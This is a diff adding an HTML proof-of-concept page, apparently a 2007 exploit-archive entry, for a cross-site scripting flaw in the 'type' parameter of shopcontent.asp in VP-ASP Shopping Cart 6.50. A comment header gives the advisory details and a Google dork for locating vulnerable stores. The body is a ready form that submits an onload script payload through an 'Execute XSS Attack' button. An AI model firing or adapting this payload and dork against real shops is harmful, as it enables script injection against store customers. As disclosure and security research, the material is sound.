@@ -1,0 +1,48 @@
+&lt;!--
+
+VP-ASP Shopping Cart 6.50 - Cross-Site Scripting Vulnerability
+
+A cross-site scripting vulnerability in VP-ASP Shopping Cart 6.50 was 
+discovered. The vendor, VP-ASP, shipped an official patch on May 16th, 
+2007.
+
+Vulnerable Variable: type
+Vulnerable File: shopcontent.asp
+Vulnerable: VP-ASP Shopping Cart 6.50 (other versions should also be 
+vulnerable)
+Google d0rk: intitle:&quot;VP-ASP Shopping Cart 6.50&quot;
+
+John Martinelli
+john@martinelli.com
+
+RedLevel Security
+http://www.RedLevel.org
+
+May 16th, 2007
+
+!--&gt;
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;VP-ASP Shopping Cart 6.50 - Cross-Site Scripting 
+Vulnerability&lt;/title&gt;&lt;body&gt;
+&lt;center&gt;&lt;br&gt;&lt;br&gt;
+&lt;font size=4&gt;VP-ASP Shopping Cart 6.50 - Cross-Site Scripting 
+Vulnerability&lt;/font&gt;&lt;br&gt;
+&lt;font size=3&gt;discovered by &lt;a href=&quot;http://john-martinelli.com&quot;&gt;John 
+Martinelli&lt;/a&gt; of &lt;a href=&quot;http://redlevel.org&quot;&gt;RedLevel 
+Security&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+Google d0rk: &lt;a 
+href=&quot;http://www.google.com/search?q=intitle%3A%22VP-ASP+Shopping+Cart+6.50%22&quot;&gt;intitle:&quot;VP-ASP 
+Shopping Cart 6.50&quot;&lt;/a&gt;
+&lt;/font&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+&lt;center&gt;file &lt;b&gt;shopcontent.asp&lt;/b&gt; - variable &lt;b&gt;type&lt;/b&gt; - method 
+&lt;b&gt;get&lt;/b&gt;&lt;/center&gt;&lt;br&gt;
+&lt;form action=&quot;http://www.example.com/shop/shopcontent.asp&quot; method=&quot;get&quot;&gt;
+&lt;input size=75 name=&quot;type&quot; value=&quot;&lt;body onload=alert(1)&gt;&quot;&gt;
+&lt;input type=submit value=&quot;Execute XSS Attack&quot; class=&quot;button&quot;&gt;
+&lt;/form&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+&lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt; 
